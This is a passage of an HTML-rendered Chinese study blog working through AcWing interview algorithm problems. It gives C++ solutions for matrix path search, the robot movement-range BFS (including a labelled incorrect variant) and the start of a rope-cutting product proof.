stretchy="false">(</mo><msup><mi>n</mi><mn>2</mn></msup><msup><mn>3</mn><mi>k</mi></msup><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(n^23^k)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.0991em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">n</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span><span class="mord"><span class="mord">3</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8491em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.03148em;">k</span></span></span></span></span></span></span></span><span class="mclose">)</span></span></span></span></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">  vector&lt;vector&lt;<span class="type">char</span>&gt;&gt; mat;</span><br><span class="line">  string str;</span><br><span class="line">  <span class="type">int</span> dx[<span class="number">4</span>] = &#123;<span class="number">-1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>&#125;, dy[<span class="number">4</span>] = &#123;<span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">-1</span>&#125;;</span><br><span class="line">  </span><br><span class="line">  <span class="function"><span class="type">bool</span> <span class="title">hasPath</span><span class="params">(vector&lt;vector&lt;<span class="type">char</span>&gt;&gt; &amp;_matrix, string &amp;_str)</span> </span>&#123;</span><br><span class="line">    mat = _matrix, str = _str;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; mat.<span class="built_in">size</span>(); i++) &#123;</span><br><span class="line">      <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; mat[<span class="number">0</span>].<span class="built_in">size</span>(); j++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">dfs</span>(i, j, <span class="number">0</span>)) <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="function"><span class="type">bool</span> <span class="title">dfs</span><span class="params">(<span class="type">int</span> x, <span class="type">int</span> y, <span class="type">int</span> d)</span> </span>&#123;  <span class="comment">// 形参不要用i,j, 因为循环常用</span></span><br><span class="line">    <span class="keyword">if</span> (mat[x][y] != str[d]) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">if</span> (d == str.<span class="built_in">size</span>() - <span class="number">1</span>) <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="type">char</span> t = mat[x][y];  <span class="comment">// 将匹配过的字符改为特殊字符, 防止重复匹配</span></span><br><span class="line">    mat[x][y] = <span class="string">&#x27;@&#x27;</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">4</span>; i++) &#123;</span><br><span class="line">      <span class="type">int</span> a = x + dx[i], b = y + dy[i];</span><br><span class="line">      <span class="keyword">if</span> (a &gt;= <span class="number">0</span> &amp;&amp; a &lt; mat.<span class="built_in">size</span>() &amp;&amp; b &gt;= <span class="number">0</span> &amp;&amp; b &lt; mat[<span class="number">0</span>].<span class="built_in">size</span>()) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">dfs</span>(a, b, d + <span class="number">1</span>)) <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    mat[x][y] = t;  <span class="comment">// u+1在3个方向(4个除去来时位置)都无法匹配, u处往后无法匹配, 放弃时需要回溯</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h1 id="Week-2">Week 2</h1><h2 id="机器人的运动范围★"><a href="https://www.acwing.com/problem/content/22/">机器人的运动范围★</a></h2><p>地上有一个 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>m</mi></mrow><annotation encoding="application/x-tex">m</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">m</span></span></span></span> 行和 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi></mrow><annotation encoding="application/x-tex">n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">n</span></span></span></span> 列的方格，横纵坐标范围分别是 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>0</mn><mo>∼</mo><mi>m</mi><mo>−</mo><mn>1</mn></mrow><annotation encoding="application/x-tex">0 \sim m - 1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">0</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">∼</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6667em;vertical-align:-0.0833em;"></span><span class="mord mathnormal">m</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">1</span></span></span></span> 和 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>0</mn><mo>∼</mo><mi>n</mi><mo>−</mo><mn>1</mn></mrow><annotation encoding="application/x-tex">0 \sim n - 1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">0</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">∼</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6667em;vertical-align:-0.0833em;"></span><span class="mord mathnormal">n</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">1</span></span></span></span>。</p><p>一个机器人从坐标 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">(</mo><mn>0</mn><mo separator="true">,</mo><mn>0</mn><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">(0,0)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord">0</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">0</span><span class="mclose">)</span></span></span></span> 的格子开始移动，每一次只能向左，右，上，下四个方向移动一格。</p><p>但是不能进入行坐标和列坐标的数位之和大于 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>k</mi></mrow><annotation encoding="application/x-tex">k</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span></span></span></span> 的格子。</p><p>请问该机器人能够达到多少个格子？</p><p><strong>注意</strong>:</p><ol><li><code>0&lt;=m&lt;=50</code></li><li><code>0&lt;=n&lt;=50</code></li><li><code>0&lt;=k&lt;=100</code></li></ol><p><strong>样例1</strong></p><pre><code>输入：k=7, m=4, n=5输出：20</code></pre><p><strong>样例2</strong></p><pre><code>输入：k=18, m=40, n=40输出：1484解释：当k为18时，机器人能够进入方格（35,37），因为3+5+3+7 = 18。      但是，它不能进入方格（35,38），因为3+5+3+8 = 19。</code></pre><h3 id="BFS大法好-O-nm">BFS大法好 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><mi>n</mi><mi>m</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(nm)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord mathnormal">nm</span><span class="mclose">)</span></span></span></span></h3><p>注意题目要求“每一次只能向左，右，上，下四个方向移动一格”，所以使dfs或者bfs就能不重不漏的求得结果，。</p><blockquote><p>一定要能熟练写对呀。</p></blockquote><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">  <span class="function"><span class="type">int</span> <span class="title">get_sum</span><span class="params">(<span class="type">int</span> x, <span class="type">int</span> y)</span> </span>&#123;</span><br><span class="line">    <span class="type">int</span> sum = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> (x) &#123;</span><br><span class="line">      sum += x % <span class="number">10</span>;</span><br><span class="line">      x /= <span class="number">10</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> (y) &#123;</span><br><span class="line">      sum += y % <span class="number">10</span>;</span><br><span class="line">      y /= <span class="number">10</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> sum;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="type">int</span> <span class="title">movingCount</span><span class="params">(<span class="type">int</span> threshold, <span class="type">int</span> rows, <span class="type">int</span> cols)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (!rows || !cols) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="type">int</span> res = <span class="number">0</span>;</span><br><span class="line">    vector&lt;vector&lt;<span class="type">bool</span>&gt;&gt; <span class="built_in">st</span>(rows, <span class="built_in">vector</span>&lt;<span class="type">bool</span>&gt;(cols, <span class="literal">false</span>));</span><br><span class="line">    queue&lt;pair&lt;<span class="type">int</span>, <span class="type">int</span>&gt;&gt; q;</span><br><span class="line">    q.<span class="built_in">push</span>(&#123;<span class="number">0</span>, <span class="number">0</span>&#125;);</span><br><span class="line">    </span><br><span class="line">    <span class="type">int</span> dx[<span class="number">4</span>] = &#123;<span class="number">-1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>&#125;, dy[<span class="number">4</span>] = &#123;<span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">-1</span>&#125;;</span><br><span class="line">    <span class="keyword">while</span> (q.<span class="built_in">size</span>()) &#123;</span><br><span class="line">      <span class="keyword">auto</span> t = q.<span class="built_in">front</span>();</span><br><span class="line">      q.<span class="built_in">pop</span>();</span><br><span class="line">      </span><br><span class="line">      <span class="type">int</span> x = t.first, y = t.second;</span><br><span class="line">      <span class="keyword">if</span> (st[x][y] || <span class="built_in">get_sum</span>(x, y) &gt; threshold) <span class="keyword">continue</span>;</span><br><span class="line">      st[x][y] = <span class="literal">true</span>;</span><br><span class="line">      res++;</span><br><span class="line">      </span><br><span class="line">      <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">4</span>; i++) &#123;</span><br><span class="line">        <span class="type">int</span> a = x + dx[i], b = y + dy[i];</span><br><span class="line">        <span class="keyword">if</span> (a &gt;= <span class="number">0</span> &amp;&amp; a &lt; rows &amp;&amp; b &gt;= <span class="number">0</span> &amp;&amp; b &lt; cols &amp;&amp; !st[a][b]) &#123;</span><br><span class="line">          q.<span class="built_in">push</span>(&#123;a, b&#125;);</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> res;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p><strong>错误写法</strong></p><p>“判断是否走过”一定要放到<code>res++</code>前，下面这样写会导致算结果偏多：</p><table><thead><tr><th style="text-align:center">3</th><th style="text-align:center">4</th></tr></thead><tbody><tr><td style="text-align:center">1</td><td style="text-align:center">2</td></tr></tbody></table><p>1号出队列后会将2和3入队，3出队列时会将4入队，此时2比4更靠近对头，所以2出对时会将4重复入队。<br>虽然在入队后，马上标记<code>st[a][b] = true</code>就能解决问题，但是还是更推荐上面的思路和写法。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">movingCount</span><span class="params">(<span class="type">int</span> threshold, <span class="type">int</span> rows, <span class="type">int</span> cols)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (!rows || !cols) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    </span><br><span class="line">  <span class="type">int</span> res = <span class="number">0</span>;</span><br><span class="line">  vector&lt;vector&lt;<span class="type">bool</span>&gt;&gt; <span class="built_in">st</span>(rows, <span class="built_in">vector</span>&lt;<span class="type">bool</span>&gt;(cols, <span class="literal">false</span>));</span><br><span class="line">  queue&lt;pair&lt;<span class="type">int</span>, <span class="type">int</span>&gt;&gt; q;</span><br><span class="line">  q.<span class="built_in">push</span>(&#123;<span class="number">0</span>, <span class="number">0</span>&#125;);</span><br><span class="line">    </span><br><span class="line">  <span class="type">int</span> dx[<span class="number">4</span>] = &#123;<span class="number">-1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>&#125;, dy[<span class="number">4</span>] = &#123;<span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">-1</span>&#125;;</span><br><span class="line">  <span class="keyword">while</span> (q.<span class="built_in">size</span>()) &#123;</span><br><span class="line">    <span class="keyword">auto</span> t = q.<span class="built_in">front</span>();</span><br><span class="line">    q.<span class="built_in">pop</span>();</span><br><span class="line">    <span class="type">int</span> x = t.first, y = t.second;</span><br><span class="line">    st[x][y] = <span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">get_sum</span>(x, y) &gt; threshold) <span class="keyword">continue</span>;</span><br><span class="line">    res++;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">4</span>; i++) &#123;</span><br><span class="line">      <span class="type">int</span> a = x + dx[i], b = y + dy[i];</span><br><span class="line">      <span class="keyword">if</span> (a &gt;= <span class="number">0</span> &amp;&amp; a &lt; rows &amp;&amp; b &gt;= <span class="number">0</span> &amp;&amp; b &lt; cols &amp;&amp; !st[a][b]) &#123;</span><br><span class="line">        q.<span class="built_in">push</span>(&#123;a, b&#125;);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> res;</span><br></pre></td></tr></table></figure><h2 id="剪绳子"><a href="https://www.acwing.com/problem/content/24/">剪绳子</a></h2><p>给你一根长度为 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi></mrow><annotation encoding="application/x-tex">n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">n</span></span></span></span> 绳子，请把绳子剪成 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>m</mi></mrow><annotation encoding="application/x-tex">m</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">m</span></span></span></span> 段（<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>m</mi></mrow><annotation encoding="application/x-tex">m</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">m</span></span></span></span>、<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi></mrow><annotation encoding="application/x-tex">n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">n</span></span></span></span> 都是整数，<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>2</mn><mo>≤</mo><mi>n</mi><mo>≤</mo><mn>58</mn></mrow><annotation encoding="application/x-tex">2 \le n \le 58</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7804em;vertical-align:-0.136em;"></span><span class="mord">2</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.7719em;vertical-align:-0.136em;"></span><span class="mord mathnormal">n</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">58</span></span></span></span> 并且 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>m</mi><mo>≥</mo><mn>2</mn></mrow><annotation encoding="application/x-tex">m \ge 2</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7719em;vertical-align:-0.136em;"></span><span class="mord mathnormal">m</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≥</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">2</span></span></span></span>）。</p><p>每段的绳子的长度记为 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>k</mi><mo stretchy="false">[</mo><mn>1</mn><mo stretchy="false">]</mo><mtext>、</mtext><mi>k</mi><mo stretchy="false">[</mo><mn>2</mn><mo stretchy="false">]</mo><mtext>、</mtext><mo>…</mo><mo>…</mo><mtext>、</mtext><mi>k</mi><mo stretchy="false">[</mo><mi>m</mi><mo stretchy="false">]</mo></mrow><annotation encoding="application/x-tex">k[1]、k[2]、……、k[m]</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mopen">[</span><span class="mord">1</span><span class="mclose">]</span><span class="mord cjk_fallback">、</span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mopen">[</span><span class="mord">2</span><span class="mclose">]</span><span class="mord cjk_fallback">、</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="minner">……</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord cjk_fallback">、</span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mopen">[</span><span class="mord mathnormal">m</span><span class="mclose">]</span></span></span></span>。</p><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>k</mi><mo stretchy="false">[</mo><mn>1</mn><mo stretchy="false">]</mo><mi>k</mi><mo stretchy="false">[</mo><mn>2</mn><mo stretchy="false">]</mo><mo>…</mo><mi>k</mi><mo stretchy="false">[</mo><mi>m</mi><mo stretchy="false">]</mo></mrow><annotation encoding="application/x-tex">k[1]k[2] … k[m]</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mopen">[</span><span class="mord">1</span><span class="mclose">]</span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mopen">[</span><span class="mord">2</span><span class="mclose">]</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="minner">…</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mopen">[</span><span class="mord mathnormal">m</span><span class="mclose">]</span></span></span></span> 可能的最大乘积是多少？</p><p>例如当绳子的长度是 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>8</mn></mrow><annotation encoding="application/x-tex">8</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">8</span></span></span></span> 时，我们把它剪成长度分别为 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>2</mn><mtext>、</mtext><mn>3</mn><mtext>、</mtext><mn>3</mn></mrow><annotation encoding="application/x-tex">2、3、3</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord">2</span><span class="mord cjk_fallback">、</span><span class="mord">3</span><span class="mord cjk_fallback">、</span><span class="mord">3</span></span></span></span> 的三段，此时得到最大的乘积 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>18</mn></mrow><annotation encoding="application/x-tex">18</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">18</span></span></span></span>。</p><p><strong>样例</strong></p><pre><code>输入：8输出：18</code></pre><h3 id="数学分析-O-n">数学分析 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><mi>n</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(n)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mclose">)</span></span></span></span></h3><blockquote><p>以下分析来自于<a href="https://www.acwing.com/solution/content/731/">y总</a><br>本人建议按数字大小从2到5、6分析就能发现规律了（做过此题的前提下）</p></blockquote><p>这道题目是数学中一个很经典的问题。<br>下面我们给出证明：</p><p>首先把一个正整数 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>N</mi></mrow><annotation encoding="application/x-tex">N</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">N</span></span></span></span> 拆分成若干正整数只有有限种拆法，所以存在最大乘积。<br>假设 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>N</mi><mo>=</mo><msub><mi>n</mi><mn>1</mn></msub><mo>+</mo><msub><mi>n</mi><mn>2</mn></msub><mo>+</mo><mo>⋯</mo><mo>+</mo><msub><mi>n</mi><mi>k</mi></msub></mrow><annotation encoding="application/x-tex">N=n_1+n_2+\cdots +n_k</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">N</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.7333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">n</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.7333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">n</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.6667em;vertical-align:-0.0833em;"></span><span class="minner">⋯</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.5806em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">n</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3361em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.03148em;">k</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>，并且 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>n</mi><mn>1</mn></msub><mo>×</mo><msub><mi>n</mi><mn>2</mn></msub><mo>×</mo><mo>⋯</mo><mo>×</mo><msub><mi>n</mi><mi>k</mi></msub></mrow><annotation encoding="application/x-tex">n_1×n_2×\cdots ×n_k</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">n</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">×</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.7333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">n</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" 